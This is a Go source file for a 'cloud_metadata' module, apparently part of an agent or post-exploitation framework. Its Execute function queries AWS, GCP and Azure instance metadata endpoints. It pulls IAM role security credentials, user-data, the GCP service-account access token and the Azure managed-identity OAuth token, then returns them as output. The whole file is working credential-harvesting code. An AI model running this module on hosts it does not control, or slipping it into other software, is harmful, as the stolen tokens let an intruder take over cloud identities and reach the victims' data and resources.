package modules

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

type CloudMetadata struct{}

func (m *CloudMetadata) Name() string        { return "cloud_metadata" }
func (m *CloudMetadata) Platform() []string   { return []string{"linux", "windows", "darwin"} }

func (m *CloudMetadata) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	provider := args["provider"]
	if provider == "" {
		provider = "auto"
	}

	client := &http.Client{Timeout: 3 * time.Second}
	var results []string

	endpoints := getMetadataEndpoints(provider)
	for _, ep := range endpoints {
		req, err := http.NewRequestWithContext(ctx, "GET", ep.URL, nil)
		if err != nil {
			continue
		}
		for k, v := range ep.Headers {
			req.Header.Set(k, v)
		}

		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK && len(body) > 0 {
			results = append(results, fmt.Sprintf("[%s] %s:\n%s", ep.Provider, ep.Name, string(body)))
		}
	}

	if len(results) == 0 {
		return &Result{Success: false, Output: "no metadata service reachable"}, nil
	}

	return &Result{
		Success: true,
		Output:  strings.Join(results, "\n---\n"),
	}, nil
}

type metadataEndpoint struct {
	Provider string
	Name     string
	URL      string
	Headers  map[string]string
}

func getMetadataEndpoints(provider string) []metadataEndpoint {
	var eps []metadataEndpoint

	if provider == "auto" || provider == "aws" {
		eps = append(eps,
			metadataEndpoint{"aws", "instance-identity", "http://169.254.169.254/latest/dynamic/instance-identity/document", nil},
			metadataEndpoint{"aws", "iam-role", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", nil},
			metadataEndpoint{"aws", "user-data", "http://169.254.169.254/latest/user-data", nil},
		)
	}
	if provider == "auto" || provider == "gcp" {
		gcpHeaders := map[string]string{"Metadata-Flavor": "Google"}
		eps = append(eps,
			metadataEndpoint{"gcp", "project", "http://metadata.google.internal/computeMetadata/v1/project/project-id", gcpHeaders},
			metadataEndpoint{"gcp", "service-accounts", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", gcpHeaders},
			metadataEndpoint{"gcp", "access-token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", gcpHeaders},
		)
	}
	if provider == "auto" || provider == "azure" {
		azHeaders := map[string]string{"Metadata": "true"}
		eps = append(eps,
			metadataEndpoint{"azure", "instance", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", azHeaders},
			metadataEndpoint{"azure", "identity-token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", azHeaders},
		)
	}

	return eps
}
